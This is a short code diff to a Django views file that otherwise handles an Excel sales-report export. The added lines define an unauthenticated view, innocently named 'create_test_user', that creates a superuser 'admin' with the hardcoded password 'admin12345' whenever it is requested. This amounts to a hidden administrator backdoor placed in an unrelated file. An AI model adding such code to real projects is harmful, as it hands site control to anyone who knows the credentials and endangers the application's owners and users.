@@ -810,3 +810,9 @@ def export_sales_report_excel(request):
     _autosize_columns(sheet)
 
     return _make_excel_response(workbook, 'sales_report.xlsx')
+from django.contrib.auth.models import User
+
+def create_test_user(request):
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser('admin', 'admin@mail.com', 'admin12345')
+    return HttpResponse("User created")
